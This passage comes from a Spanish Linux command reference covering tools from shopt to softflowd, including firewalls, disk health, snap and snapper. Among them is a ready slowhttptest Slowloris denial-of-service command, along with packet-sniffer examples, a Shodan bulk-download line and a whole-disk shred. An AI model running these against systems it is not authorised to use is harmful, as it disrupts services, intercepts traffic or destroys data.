# cat archivo.txt | xargs -I% shodan download % % (download a partir de un listado. Pueden ser ips, modelos de router, camaras ip... una por linea)
# dir *json.gz -1 | xargs -I% shodan parse --fields ip_str,port,org --separator , % (Ver los resultados del comando anterior)


shopt
Habilita o deshabilita variables opcionales del comportamiento del shell bash.
$ shopt (listado de todas las opciones de shell y su valor actual [activadas o desactivadas])
$ shopt -s (lista las que están activas)
$ shopt -u (las que están inactivas)
$ shopt -s dotglob (activar una función del listado anterior. En el ejemplo, incluye en la expanción de comodines los ficheros que empiezan por punto [.])
$ shopt -u dotglob (desactivarla)
$ shopt -p (muestra las opciones para activarlas o desactivarlas)
$ shopt -o (las que están "on" y las que están "off")
Algunas variables:
cdable_vars (Permite que cd use los valores de las variables como nombres de directorios)
cdspell (Ignora pequeños errores en los cambios de directorio con cd. Sólo en la ejecución interactiva)
cmdhist (Guarda los comandos que hemos escrito en varias líneas en una sola línea del historial)
dotglob (Incluye en la expansión de comodines los ficheros que empiezan por punto (.))
expand_aliases (Expande un alias cuando lo ejecuta)
extglob (Utiliza extensiones de los comodines)
failglob (Si falla la expansión de un comodín porque no encuentra nada falla el comando (como hace el C Shell))
force_fignore (Los sufijos especificados en la variable de entorno FIGNORE no se usan para completar palabras con tabulador)
hostcomplete (Se intenta completar nombres de host al pulsar tabulador cuando la palabra contiene una @)
interactive_comments (Permite que dentro de un comando de sesión interactiva haya comentarios (precedidos por #))
login_shell (Variable de sólo lectura que indica si Bash ha sido lanzado como un shell de login)
nocaseglob (Indica si los comodines expanden sin sensibilidad a mayúsculas/minúsculas. No confundir con la variable completion-ignore-case de inputrc que lo que hacía era expandir con tabulador.)
nullglob (Hace que cuando un patrón no encuentra ficheros, se expandan por la cadena vacía en vez de por el patrón sin expandir)
sourcepath (Hace que el comando interno source busque el argumento en los directorios que indique PATH)


shorewall
Cortafuegos.
# shorewall check (Chequea los archivos de configuración. Si finaliza con el mensaje "Shorewall configuration verified" todo está correcto)
# shorewall start (Arrancar el cortafuegos. "stop" para parar y "restart" para reiniciar)
# shorewall safe-start (Arrancar de forma segura. Aplicable tambien a safe-restart)
# shorewall clear (Desactivar todas las reglas de filtrado y enrutado)
# shorewall status (Ver el estado del firewall)
Configuración:
# nano /etc/default/shorewall
startup=1 (Aplicar las reglas al iniciar el sistema)
# nano /etc/shorewall/rules
Especificar los protocolos que se permitirán acceder a nuestra máquina des de el exterior:
SSH/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	22
Otro ejemplo:
Web/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	80
Otro para ftp:
FTP/ACCEPT	net	$FW
Equivalente a:
ACCEPT		net	$FW	tcp	21
Las opciones pueden ser DROP, ACCEPT y REJECT
Otros archivos de configuración:
/etc/shorewall/policy
/etc/shorewall/interfaces
/etc/shorewall/zones


show_all_colors
Muestra un listado de todos los colores disposibles.
$ show_all_colors


showconsolefonts
Muestra las fuentes de las ttys
$ showconsolefonts -v -C /dev/tty2 (Con información adicional y especificando la tty)


showfigfonts
Muestra las fuentes disponibles para el comando figlet.


showfsck
Mostrar el número de reinicios que faltan hasta forzar un chequeo fsck.
# showfsck


showkey
Muestra el código de la tecla pulsada.
$ showkey -a (arranca el prompt y mostrarà el código ascii de cada tecla que se pulse hasta finalizar con ctrl+d)


showrgb
listado de los colores reconocidos por el sistema y valor RGB
$ for line in {0..17}; do for col in {0..15}; do code=$(( $col * 18 + $line )); printf $'\e[38;05;%dm %03d' $code $code ;done; echo ;done (Muestra el código numérico de los 256 colores)
$ showrgb | grep red (Muestra el código)


shred
[secure-delete]. Borrar de forma segura espacios de disco
$ shred -fuv  archivo    (Borra archivo y sobreescribe su espacio  25 veces)
$ shred -zn10 /dev/sda (Borrar un disco sobreescribiendo 10 veces)
$ shred -fuv -n 50 archivo     (Lo mismo pero 50 veces)
$ shred -u -z -n 20 archivo.txt  (suprime un archivo y reescribe el espacio 20 veces con ceros)


shuf
Genera numeros aleatorio y muestra lineas de archivo de forma aleatoria.
$ shuf -n 4 /etc/fstab -o archivo (Muestra 4 lineas aleatorias del archivo y manda el resultado a "archivo")
$ shuf -i 1-49 -n 6 (para la loto. Numeros aleatorios de 1 al 49 y que muestre 6)
-i [x-y]  rango de números
-n   Cantidad de numeros a visualizar
1.-
Reproducir un CD al azar. Precisa cdtool :
$ for track in $(seq $(cdinfo | grep 'Number of tracks' | awk '{print $NF}') | shuf); do cdplay "$track"; done


shutdown
Apagar/reiniciar el pc.
$ shutdown -h now    (apagar ya)
$ shutdown -r now     (reiniciar ya)
# shutdown -h +20 (apagado dentro de 20 minutos)
# shutdown -c   (anula la cuenta regresiva anterior)
# shutdown -rF now  (forzar fsck en el reinicio)
# shutdown -h $((60 * 4)) (Apagar dentro de 4 horas)
# shutdown -h 20:30 -k "Se apagará a las 20 horas 30 minutos" (apagar a las 20,30 y mandando un mensaje a los usuarios)


shutdown-at-night
Programar apagados regulares de estaciones de trabajo. La secuencia de apagado se iniciará a través de CRON. Sin embargo, solo se apagarán las máquinas que aparezcan inactivas o sin uso. Las máquinas que estén en uso permanecerán en funcionamiento. El archivo de configuración en /usr/lib/shutdown-at-night/shutdown-at-night.


sic
Cliente IRC [protocolo para comunicación basada en texto en tiempo real, comúnmente utilizado para discusiones grupales, intercambio de archivos y juegos en línea]
$ sic -h host -n nickname -k pasword (Conéctese a un host determinado con el nickname y el password)
$ :j #channel (unirse a un canal)
$ :m #channel/user "hola user" (enviar un mensaje a un usuario de un canal)
$ :s #channel/user (establecer un canal o un usuario predeterminados)
$ :l #channel (salir de un canal)


signos-comodines
1
	Tecla barra inclinada (\)
	Delante de un comando indica que este se ejecuta tal cual, sin hacer uso de algún alias que pudiera tener.
	$ \ls
2
	Tecla asterisco (*)
	cualquier caracter o cadena de caracteres
	$ find /home/usuario -iname text*
3
	Interrogante cerrado (?)
	Substituye un solo caracter
	$ find /home/usuario -iname text?.txt
4
	Corchetes ([ ])
	Cualquier caracter que este dentro de los corchetes [a-g] ,  [12-32]
	$ find /home/usuario iname text[m-t].txt
5
	Dos admiraciones cerradas (!!)
	Repite el último comando.
	$ tail -f /var/log/fail2ban.log
	Permiso denegado
	$ sudo !!
	sudo tail -f /var/log/fail2ban.log
	Dime la contraseña....
6
	Signo mayor que (>)
	Antepuesto a un archivo, borra todo su contenido.
	$ > archivo
7
	Tecla espacio
	Anteponiendo un espacio delante de un comando este no se almacena en el historial.
8
	Acento circunflejo (^)
	Si al ejecutar un comando tecleamos mal una ruta, por ejemplo, confundiendo /home por /hmoe, podemos enmendar el error con:
 	$ ^hmoe^home


siggen
Utilidad que muestra los valores de la función hash para los archivos especificados.
$ siggen -a archivo.txt (muestra el hash en MD5, SHA, HAVAL y CRC32)
$ siggen -h archivo.txt (Los mismos hash pero en hexadecimal)
$ siggen -M archivo.txt (el hash solo en MD5. -S para SHA, -C para CRC32 y -H para HAVAL)
$ siggen -a archivo.txt archivo2.txt (para dos archivos)


signify-openbsd
Firmar y verificar archivos criptográficamente.
$ signify-openbsd -G -p clave.pub -s clave.sec -c "Pequeñas pruebas de claves" (Crear un par de claves con un mensaje)
$ signify-openbsd -S -s clave.sec -m bashrc -x bashrc.sig (Firmar una copia de .bashrc especificando un nombre de firma)
$ signify-openbsd -V -p clave.pub -m bashrc (Verificar una firma utilizando el nombre de firma predeterminado)
$ signify-openbsd -C -p clave.pub -x firma.sig (cualquiera que tenga la clave pública, puede verificar la firma)
Nota.- El archivo de clave privada ".sec" no debe compartirse con nadie. El archivo de clave pública ".pub" se puede compartir con cualquiera.


sigtool
Ver clamav


silversearcher-ag
Programa muy rápido similar a grep [ver] o ack [ver] para buscar palabras y archivo en directorios. Ignora archivos binarios y ocultos por defecto.
$ ag "function calcular_total" (buscar "function calcular_total" en el directorio actual y subdirectorios)
$ ag "ERROR" /var/log/ (busca "ERROR" en el directorio y subdirectorios especificado)
$ ag -w "int" (buscar palabras que coincidan exactamente [whole-word]. Esto evitará que coincida con print, internal, etc. )
$ ag -i "debug" (búsqueda case-insensitive [ignorar mayúsculas/minúsculas])
$ ag "import requests" -G "\.py$" (buscar en archivos con una extensión específica)
$ ag "patrón" --ignore-dir=Vídeos $HOME (excluir directorio "Vídeos" de la $HOME en la búsqueda de "patron")
$ ag -g "\.conf$" (buscar solo en nombres de archivos .conf, no en su contenido)
$ ag --numbers "patrón" (mostrar el número de línea en los resultados. Está activado por defecto)
$ ag -c "TODO" (buscar en archivos que coincidan con un patrón)
$ ag "function" -G "\.js$" (buscar function solo en archivos .js)


simhash
Se usa para calcular y comparar hashes de archivos de similitud.
$ simhash -c hash1 hash2


similarity-tester
Encuentra similitudes léxicas en textos en C, C ++, Java, Pascal, Modula-2, Lisp, Miranda y text. Esto se puede usar para detectar fragmentos de código potencialmente duplicados en grandes proyectos de software y para detectar plagio en software y proyectos basados en texto, educativos y de otro tipo. Los ejecutables empiezan por "sim_": sim_8086, sim_c, sim_c++, sim_java, sim_lisp, sim_m2, sim_mira, sim_pasc y sim_text.
$ sim_c *.c (resalta el código C duplicado en el directorio)
$ sim_text texto1.txt texto2.txt (de dos textos)


sinfo
Monitoreo de clústeres que utiliza transmisiones de red para distribuir información sobre el estado de los nodos locales, incluido el uso de CPU y memoria, la carga de red y los cinco procesos principales. Consiste en un demonio que se ejecuta en cada nodo y una interfaz de usuario ncurses para monitorearlos.
$ sinfo-client
$ sinfod


sistema-gráfico
Instalar las X en UbuntuServer
# apt-get install ubuntu-desktop (Completo)
# apt-get install x-window-system-core gnome-core (mínimo)
# apt-get install language-pack-es language-pack-es-base language-pack-gnome-es language-pack-gnome-es-base language-selector language-support-es  (instalar los paquetes de idiomas en la instalación mínima))
# apt-get install gksu gnome-system-tools gnome-nettool (herramientas de red  y paquetes necesarios en la instalación mínima)
$ startx


skdet
Busca rootkits y puertos abiertos. Descarga wget http://dvgevers.home.xs4all.nl/skdet/skdet
# skdet -c (rootkits)
# skdet -p PID (sobre un PID)
# skdet -s (puertos abiertos)


skel
Directorio [/etc/skel/] que contiene ficheros y directorios que son automaticamente copiados al directorio personal al crear un nuevo usuario [ver useradd]. Las modificaciones que puedan realizarse en este directorio, ya sea añadiendo carpetas o modificando parámetros [en .bashrc, .profile...] no se aplicarán a usuarios existentes, sólo a los de nueva creación.


skill
Matar procesos.
# skill -l (Lista las señales pque pueden usarse)
# skill -L (otra forma de ver la lista)
# skill -KILL -u usuario (Matar todos los procesos de un usuario)
# skill -STOP -u usurario (Parar los procesos de un usuario)
# skill -CONT -u usuario (Reactivarlos)
# skill -KILL -v /dev/pts/* (Cerrar todas las sesiones de un sistema)
# skill -p PID (Matar el proceso)
# skill -c firefox (Matar por nombre aplicación)


skopeo
Herramienta diseñada para interactuar con imágenes de contenedores y registros de imágenes remotos o locales.
$ skopeo inspect docker://registry.fedoraproject.org/fedora:latest (obtiene metadatos de una imagen de Fedora remota sin descargarla por completo)
$ skopeo inspect docker://centos/mongodb-26-centos7 | jq '.Labels' (inspecciona labels de una imagen de MongoDB y filtra con jq para JSON)
$ skopeo inspect --creds usuario:contraseña docker://mi-registry.com/imagen:tag (haciendo constar las credenciales)
$ skopeo copy docker://docker.io/busybox:latest docker://mi-registry.com/busybox:local (copia la imagen busybox:latest de Docker Hub al registry privado)
$ skopeo copy docker://docker.io/nginx:alpine dir:/tmp/nginx-image (copia a un dir para exportar)
$ skopeo copy --sign-by dev@example.com docker://ejemplo.com/busybox:fuente docker://ejemplo.com/busybox:firmada (firma y copia en un paso)
$ skopeo copy --src-creds src-user:src-pass --dest-creds dest-user:dest-pass docker://src-registry/imagen docker://dest-registry/imagen (con credenciales(
$ skopeo delete --force docker://mi-registry.com/imagen:latest (borra una imagen de un registry- --force omite confirmaciones)
$ skopeo sync --src docker --dest dir docker://registry.example.com/busybox /tmp/busybox-sync (sincroniza todo un repo a un directorio)
$ skopeo sync --config sync.yaml docker:// docker://mi-registry.com (y luego ejecutar)
$ skopeo inspect docker://docker.io/fedora | jq '.RepoTags' (listar tags de un repositorio)
$ skopeo inspect docker://docker.io/fedora:rawhide | jq '.Digest' (verificar digest de una imagen)
$ podman run --rm quay.io/skopeo/stable inspect docker://imagen (correr Skopeo en un contenedor con Podman)
Notas.- Transports comunes: docker:// (Docker registries), oci:// (OCI), dir:// (directorios locales), atomic:// (Atomic). Para registries inseguros, agregar "--no-creds".


sl
Un tren en consola.
$ sl -a (Aparece la palabra “help” en la cabina)
$ sl -l  (Muestra un tren más pequeño)
$ sl -F  (El tren vuela)
$ sl -e  (permite la interrupción con ^C)


slack
Herramienta de gestión de configuración ligera y minimalista basada en rsync [ver], diseñada para los que quieren mantener configuraciones centralizadas y sincronizadas entre múltiples máquinas, de forma automática y con poco esfuerzo. Sus principales caracteristicas es que usa rsync como motor de sincronización, permite aplicar configuraciones [archivos, scripts, etc.] a máquinas cliente desde un servidor central y funciona bajo el principio de "pon el archivo en el lugar correcto y slack se encargará del resto". Está pensado para entornos simples, donde no se necesite herramientas complejas como Puppet, Ansible, Chef, etc. Generalmente la estructura predefinida de directorios slack es: /srv/slack/common/ [aplicables a todos], /srv/slack/hosts/<hostname>/ [específicos del host] y /srv/slack/groups/<grupo>/ [especificos del grupo]
# nano /etc/slack.conf
   ...
   SERVER=rsync://servidor-central/slack/
   GROUPS="webservers,database"
   ...
# slack (sincronizará los archivos desde el servidor central al sistema local)
Un ejemplo práctico:
Se quieres que todos los servidores tengan un motd [mensaje del día] personalizado y los servidores web tengan una configuración especial de Nginx.
En el servidor central [/srv/slack/]:
$ echo "¡Bienvenido al sistema centralizado!" > /srv/slack/common/etc/motd (mensaje del día para todos)
$ mkdir -p /srv/slack/groups/webservers/etc/nginx/sites-available/ (configuración de Nginx solo para el grupo "webservers")
$ echo "server { listen 80; root /var/www/html; }" > /srv/slack/groups/webservers/etc/nginx/sites-available/default
En un cliente web [mi-web-01]:
# nano /etc/slack.conf
SERVER=rsync://192.168.1.100/slack/
GROUPS="webservers"
Al ejecutar en el servidor:
# slack
Copia /srv/slack/common/etc/motd a /etc/motd y /srv/slack/groups/webservers/etc/nginx/... a /etc/nginx/...  en los clientes.


slackpkg
Gestor de paquetes de Slackware sin resolución de dependencias. Como previa antes de su uso es preciso descomentar el repositorio de nuestra elección en /etc/slackpkg/mirrors
# slackpkg update gpg (Bajar llaves publicas)
# slackpkg update (Recargar listado)
# slackpkg upgrade-all (Actualizar toda la distro)
# slackpkg search paquete (buscar paquete)
# slackpkg install paquete (instalar paquete)
# slackpkg upgrade paquete (actualiza el paquete elegido)
# slackpkg reinstall paquete (reinstala paquete)
# slackpkg remove paquete (desinstala paquete)
# slackpkg blacklist paquete (pone el paquete en lista negra)
# slackpkg download paquete (descarga paquete sin instalarlo)
# slackpkg info paquete (muestra informacion de paquete)
# slackpkg clean-system (Lista los paquetes obsoletos)
# slackpkg install-new (Lista los paquetes introducidos recientemente)
# slackpkg generate-template (Generar una plantilla de los paquetes instalados en un pc)
# slackpkg install-template (Instalar un slackware en un pc a partir de una plantilla))


slay
Matar todos los procesos de un usuario.
$ slay usuario
$ slay -9 usuario


sleep
Esperar el tiempo especificado antes de lanzar un comando o aplicacion
$ sleep 5s ; xwd -root -screen > pantalla.xwd   (Capturar la pantallas tras 5 segundos)
$ sleep 20m; yes > /dev/dsp (alarma. En 20 minutos suena un pitido)
$ sleep 3s && aoss espeak -v es "Levantate gandul....." 2>/dev/null (Otra forma de programar una alarma)
$ sleep 3h && halt (para el pc a las 3 horas)
$ sleep 3d && halt (para el pc a los 3 dias)


sleepd
Demonio que pone un portátil en modo de suspensión si no se está utilizando o si la batería está baja.


sleepenh
Programa especialmente diseñado para ejecutar algunas funciones periódicamente en un script de shell. No fue diseñado para ser preciso lanzarlo como un comando de consola, sino para ser útil en una secuencia que precisa "sleeps" sucesivos. Un ejemplo de scritp:
#!/usr/bin/env bash
#
TIMESTAMP=$(sleepenh 0)
while true; do
# Imprimir en pantalla el texto
echo -n "Linux es genial ";
sleepenh 0;
# mostrar cada 2 segundos el texto
TIMESTAMP=$(sleepenh $TIMESTAMP 2.0);
done


slim
Gestor de sesiones ligero. La configuración en el archivo /etc/slim.conf
$ slim -p /usr/share/slim/themes/tema_a_probar
Una vez escogido el tema lo colocamos en /etc/slim.conf substituyéndolo por el "default":
    current_theme          default
1.-
Si al usar systemd el sistema no para ni reinicia, modificar las lineas existentes por las siguientes:
halt_cmd /usr/bin/systemctl halt
reboot_cmd /usr/bin/systemctl reboot


slocate
Buscador de archivo en el sistema. Por lo visto el desarrollador dejó de trabajar en el proyecto y las distribuciones evolucionaron, primero a mlocate y luego a plocate [ver]
$ slocate -i archivo.sda (buscar sin considerar mayúsculas y minúsculas)
$ slocate -c archivo.pdf (escribir solo el número de entradas coincidentes)
$ slocate -l 5 archivo.txt (ver como máximo 5 coincidencias con archivo.txt)


slowhttptest
Efectuar ataques Slow Http Dos
$ slowhttptest -c 1000 -H -g -o ataque -i 10 -r 200 -t GET -u http://192.168.1.154 -x 30 -p 3
c (Número de conexiones con límite en 65539)
H (ataque modo SlowLoris enviando paquetes sin completar)
B (ataque modo Slow POST sin terminar de enviar el cuerpo del mensaje)
X (ataque modo Slow Read de lectura de las respuestas http lentas)
g (Generr estadistica en formato html)
o (Archivo de salida)
i (Intervalo de datos por segundo por conexión)
r (Conexiones por segundo)
t (Cabecera a utilizar)
u (URL de destino)
x (Longitud máxima de los datos)
p (Tiempo de espera de respuesta http una vez el servidor se considera inaccesible)


slurm
Monitoriza la interfaz de red
# slurm -i eth0


smartmontools
Comprobar el estado de los discos duros. Contiene los programas smartctl y smartd para controlar y supervisar los sistemas de almacenamiento mediante el sistema S.M.A.R.T. [Self-Monitoring, Analysis and Reporting Technology System]
# smartctl --scan (información relevante sobre los dispositivos de almacenamiento disponibles)
# smartctl --all /dev/nvme0n1p5 (imprime toda la información SMART de la partición nvme0n1p5)
# smartctl -iHs on /dev/nvme0n1p5 ("i" información, "H" estado de salud del dispositivo y "s on" habilita o deshabilita SMART en el dispositivo )
# smartctl -c /dev/nvme0n1p5 (verificar las capacidades SMART del dispositivo)
# smartctl -Hc /dev/sda (Si al final se lee PASSED, correcto, si FAILED cambiar disco)
# smartctl -t short /dev/sda (lanzar el test corto)
# smartctl -t long /dev/sda (ejecutar un test largo)
# smartctl -l error /dev/sda (Listar los errores)
# smartctl -l selftest /dev/nvme0n1p5 (muestra una lista con los resultados de las autopruebas recientes en orden cronológico inverso)
Nota- "LifeTime" indica las horas que el disco ha estado encendido. "LBA_of_First_error" indica los errores.
# update-smart-drivedb (actualiza /var/lib/smartmontools/drivedb/drivedb.h o DESTFILE desde branch/RELEASE_7_3_DRIVEDB del repositorio SVN de smartmontools)
# smartd (arrancar el daemon)
# sed -i 's/DEVICESCAN -d removable -n standby -m root -M exec/#DEVICESCAN -d removable -n standby -m root -M exec/' /etc/smartd.conf (comentar la opción DEVICESCAN en el archivo de configuración predeterminado para evitar que smartd intente buscar dispositivos conectados de forma indiscriminada)
# smartctl -A /dev/sda (Listar atributos internos)
Listado de algunos atributos smart
	Power_Cycle_Count (RAW_Value).- Veces que le ha llegado corriente.
	Temperature Celsius. (RAW_Value) .- Temperatura del disco
	Reallocated_Sector_Ct (RAW_Value).-  número de sectores de repuesto que ha usado el disco para sustituir sectores dañados
	Raw_Read_Error_Rate (RAW_Value).- Frequencia de errores en la lectura del disco.
	Start_Stop_Count: Cantidad de veces que se ha parado y arrancado el disco
	Seek_Error_Rate: Tasa de errores de colocación de la aguja
	Power_On_Seconds: Tiempo funcionando
	Spin_Retry_Count: Numero de reintentos de arrancada
El campo VALUE [valor] va del número 1 al 253, siendo 1 el peor. Los valores normales son los que estan entre 100 y 200. El campo WHEN_FAILED indica cuando se produjo una falla de algún atributo.
1.-
Otra forma de activar el demonio que nos avisa si se produce un error en disco:
# apt install smart-notifier
Editar el archivo de configuración:
# nano /etc/default/smartmontools
Y descomentar la linea:
start_smartd=yes
2.- El propósito de SMART es supervisar la confiabilidad del disco duro y predecir fallas del disco y realizar diferentes tipos de pruebas automáticas del disco. La ubicación predeterminada para estas notificaciones y advertencias SYSLOG normalmente se realizan en /var/log/messages o /var/log/syslog
3.- Comprobar si el disco es HDD o SSD
# smartctl -a /dev/nvme0n1p1 (comprobar si el disco es HDD o SSD)
Nota- Tambien podemos lanzar
# cat /sys/block/loop0/queue/rotational
Si el resultado es 1 es HDD si es 0 es SSD


smbclient
Conectar recursos compartidos de windows desde linux.
$ smbclient //192.168.1.155/compartido -U usuario (Después de ingresar usuario y contraseña entra en el prompt del recurso compartido)
$ smbclient -L //192.168.1.155 (Ver los recursos compartidos de la IP especificada.
1.-
Para montarlo automaticamente:
Entrar en el /etc/fstab la siguiente linea:
//192.168.1.155/compartido /media/compartido cifs username=NOMBRE, password=CONTRASEÑA,user


smbstatus
Monitorizar el estado de las conexiones del servidor samba.
# smbstatus (Listado de equipos conectados a recursos compartidos y ficheros abiertos)
# smbstatus -p (Solo el listado de los equipos conectados a samba)
# smbstatus -S (Listado de recursos y equipos conectados a ellos)
# smbstatus -L  (Listado de ficheros abiertos)


smem
Informa del uso de la memoria.
# smem -u (Por parte de los usuarios)
# smem -w (por parte del sistema)
# smem -m (de todos los procesos)
# smem -p (resultado en porcentaje


smemstat
Informa del uso de la memoria física en consideración con la memoria compartida.
# smemstat -T (Mostrar los principales consumidores de memoria)
# smemstat -t (modo interactivo mostrando los principales cambios en la memoria)
# smemstat -p tmux,firefox (mostrar el consumo de tmux y firefox)
# smemstat -g -p tmux,firefox57 (el resultado en gigabytes. -m en megabytes -k en kilobytes)


snap
[snapd]. Formato de paquete universal desarrollado por Canonical que tienen como objetivo proporcionar una forma fácil y segura de distribuir software en cualquier distribución Linux, eliminando las dependencias del sistema y asegurando que las aplicaciones funcionen sin problemas en diferentes entornos porque incluyen todas las dependencias del paquete. Los paquetes de instalan en /snap/nombre_paquete y lo ejecutables en /snap/bin y pueden convivir junto a los del mismo nombre en el sistema. Si por ejemplo, lanzamos:
$ emacs
Se ejecutará la aplicación del sistema. Si queremos el instalado con snap, lanzamos la ruta absoluta:
$ /snap/bin/emacs
Una vez instalado el programa snap:
# systemctl enable --now snapd.socket (habilitar el servicio)
# systemctl status snapd (comprobar si esta habilitado)
# snap install core (componente esencial para ejecutar paquetes Snap)
# snap refresh (actualizar todas las aplicaciones)
# snap install vlc (instalar una aplicación)
$ snap info vlc (información sobre una aplicación)
$ snap find telegram (buscar si un paquete existe en snap)
$ snap refresh vlc (actualizar una aplicación)
# snap remove vlc --purge (eliminar una aplicación)
$ snap list (listar aplicaciones snap instaladas)
$ snap changes (ver si existen detalles de actualizaciones)
# snap revert paquete (instalar una versión anterior de un paquete)


snapper
Herramienta que se utiliza para crear instantáneas del sistema [snapshots] antes o después de hacer cambios o actualizaciones en un sistema de archivos Btrfs. Además de la creación y eliminación de instantáneas, permite compararlas y revertir las diferencias entre ellas.
$ findmnt / (verificar que el sistema de archivos permita la aplicación, si no aparece btrfs no funciona)
# snapper -c root create-config / (crear el archivo de configuración para los snapshots. Crea /etc/snapper/configs/root y permite administrar instantáneas del sistema raíz)
# snapper -c root create --description «Instalación de GIMP» (crear una instantánea manualmente con la descripción)
# snapper -c root list (ver la lista de instantáneas)
# snapper -c root status 1..2 (ver los cambios entre dos snapshots)
# snapper -c root diff 1..2 /etc/nginx/nginx.conf (ver diferencias en un archivo específico)
# snapper -c root undochange 1..2 (revertir todos los cambios)
# snapper -c root undochange 1..2 /etc/nginx/nginx.conf (revertir un archivo)
# systemctl enable --now snapper-timeline.timer (que se creen los puntos de restauración automáticamente)
# snapper -c root delete 1 (eliminar instantáneas)


snapraid
[mergerfs [ver] + snapraid]. Unir varios discos en uno lógico para añadir paridad y proteger los datos contra fallos de disco. El disco de paridad /mnt/paridad debe ser al menos tan grande como el disco más grande de datos.
Ejemplo de configuración básica:
# nano /etc/snapraid.conf
        # Discos de datos (sin la barra final)
        disk d1 /mnt/disco1
        disk d2 /mnt/disco2
        disk d3 /mnt/disco3
        #
        # Disco de paridad (1 disco de paridad = protección contra 1 fallo)
        parity /mnt/paridad/snapraid.parity
        #
        # Archivo de contenido (guarda metadatos) /
        content /var/snapraid/content
        #
        # Excluir archivos temporales o basura
        exclude *.tmp
        exclude *.bak
        exclude /lost+found/
# snapraid create (crear los archivos de paridad y contenido. Puede tardar horas, dependiendo del tamaño de los discos)
# mergerfs /mnt/disco1:/mnt/disco2:/mnt/disco3 /mnt/almacenamiento -o defaults,allow_other,category.create=epmfs (montar los discos de datos con mergerfs [ver])
# snapraid sync (ejecutar cada vez que se añade o modifica archivos)
Automatizar la sincronización
# crontab -e
Añadir la línea para sincronizar diariamente a las 3 AM:
0 3 * * * /usr/bin/snapraid sync
# snapraid status (comprobar que todo funciona)
# snapraid fix (reconstruirá los archivos perdidos en otro disco)
Nota.- La paridad no se actualiza en tiempo real. Si se pierde un disco antes de sincronizar, los cambios recientes no estarán protegidos.
Ejemplo para montar todo al inicio**
# nano /etc/fstab
Añadir:
        /mnt/disco1  /mnt/disco1  ext4  defaults  0  2
        /mnt/disco2  /mnt/disco2  ext4  defaults  0  2
        /mnt/disco3  /mnt/disco3  ext4  defaults  0  2
        /mnt/paridad /mnt/paridad ext4  defaults  0  2


snarf
Descarga páginas web o listado de archivos compartidos por ftp.
$ snarf lapipaplena.net (Creará un archivo index.html)
$ snarf ftp://usuario:contraseña@servidor (Creará un archivo ftpindex.txt)


sniffit
Snifer de red. Dado que los informes los despliega en archivos de texto por cada dato, es preferible lanzar la aplicación desde dentro de una carpeta para no llenar todo el directorio de ficheros.
# sniffit -s 192.168.1.2  (Captura todos los paquetes con origen en la IP)
# sniffit -t 192.168.1.2 (Captura todos los paquetes con destino en la IP)
# sniffit -b -s 192.168.1.2 (Captura los paquetes con origen y destino en la IP)
# sniffit -F eth1 -b -s 192.168.1.33 -p 9001 (de un puerto y forzando dispositivo)


snoopy
librería que se encarga de almacenar comandos y el usuario que los ejecuta.
$ git clone https://github.com/a2o/snoopy.git
$ cd snoopy
$ ./configure
$ make
# make install
# make enable
Reiniciar los servicios que tengamos funcionando [apache2, ssh...]
# /etc/init.d/ssh restart
Monitorizar el archivo log de registro com:
# tail -f /var/log/auth.log


snooze
Herramienta parecida a cron. Ejecutar un comando en un momento determinado.
$ snooze -H 22 -M 10 musica.wav (empezar a sonar la música mencionada a las 22'10)
$ snooze -d 15 -m 3 -H 20 -M 30 -- ~/script.sh (ejecutar el script mencionado el 15 de marzo a las 8'30 de la tarde)


snort
Sniffer de paquetes y detector de intrusos
# snort -v -i eth0 (Para inspeccionar el tráfico de una red)
# snort -vde -h 192.168.0.1/24 (Inspeccionar una dirección o rango)
# snort -vde tcp (especificando protocolo)
# snort -v -X -i eth0 port 25 (Especificando un puerto y guardando la información)
# snort -v -X -i eth0 -n 5 port 25 (Capturando solo 5 paquetes)
La tarjeta de red tiene que estar en modo promiscuo
Opciones
-v          sniffer de TCP
-d y -e    Para obtener las cabeceras


sntop
Utilidad tipo top (ver), que sondea una lista de hosts en un intervalo regular para determinar si están en línea. Si no se especifica el archivo en el que constan los datos, lee de /etc/sntoprc. Tambien puede especificarse otro.
# sntop -f .sntoprc -e salida.html (especificando el archivo con los hosts y nombre de archivo de salida. Por defecto sntop.html)
# sntop -n 60 -a ~/file (especificando un tiempo en segundos de refresco de datos. Por defecto 180 y que ejecute file si uno de los host especificados se cae)
Durante la ejecución del programa pueden pulsarse la siguientes teclas:
	r (refrescar)
	w (escribir la salida en un archivo)
	q (salir)
	pulsado cualquier tecla tambien se refresca la salida
Un ejempo de archivo sntoprc seria:
	templix
	192.168.1.35
	mi server a toda pastilla
	#
	La Pipa Plena
	lapipaplena.org
	El de la asociacion
	#
	otro pc
	192.168.1.145
	el del comedor


socklist
[procinfo]. Lista conectores de red abiertos (sockets), mostrando tipo, número de puerto y otros datos específicos.
$ socklist


socklog
Herramienta utilizada para gestionar los registros [logs] del sistema. Incluye las aplicaciones socklog-check , tryto (intenta ejecutar un comando limitado por un tiempo de espera o un número de intentos), uncat y socklog-conf (configura un servicio)
# socklog-check (comprueba la disponibilidad de un servicio. En caso de éxito, devuelve 0)
# socklog -r inet 127.0.0.1 80 (activar mensajes sin formato del servicio inet de la ip y puerto mencionados)
# uncat -v -t 20 -s 2048 inet (verbose, tiempo, 20 segundos [por defecto 300], 2048 de tamaño [por defecto 1024] y servicio inet)
# tryto nginx (si el comando falla devuelve código de salida 0)
# socklog-conf USER GRUPO directorio_de_servicio directorio_de_log (los que ejcutaran el servicio, donde se crearán los directorios de supervisión y donde se almacenan los registros)


sockperf
Utilidad de evaluación comparativa de red diseñada para probar el rendimiento y latencia de la red.
$ sockperf tp -i 127.0.0.1 (prueba de rendimiento unidireccional a la ip mencionada)
$ sockperf ul -i 127.0.0.1 (pruebas de latencia bajo carga)


sockstat
[procinfo]. Mostrar información sobre las conexiones abiertas [sockets].
$ sockstat -l (muestra todas)
$ sockstat -P 2522 (las del PID indicado)
$ sockstat -p 443 (las del puerto indicado)
$ sockstat -U USER (las del usuario especificado)


softflowd
Analizador de tráfico de red basado en flujo capaz de exportar datos de Cisco Netflow. Rastrea los flujos de tráfico registrados escuchando en una interfaz de red o leyendo un archivo de captura de paquetes.
$ softflowd -i enp1s0 (que escuche en la interfaz enp1s0 y se ejecute solo en modo de recopilación de estadísticas)
$ softflowd -i enp1s0 -n 10.1.0.2:4432 (de la interfaz enp1s0 y exporte datagramas a un recopilador que se ejecuta en 10.1.0.2 4432)
$ softflowd -i enp1s0 -n 10.1.0.2:4432,10.1.0.3:4432 (de la interfaz y se exporten datagramas que se ejecutan en los puertos 4432 10.1.0.2 y 4432 10.1.0.3)
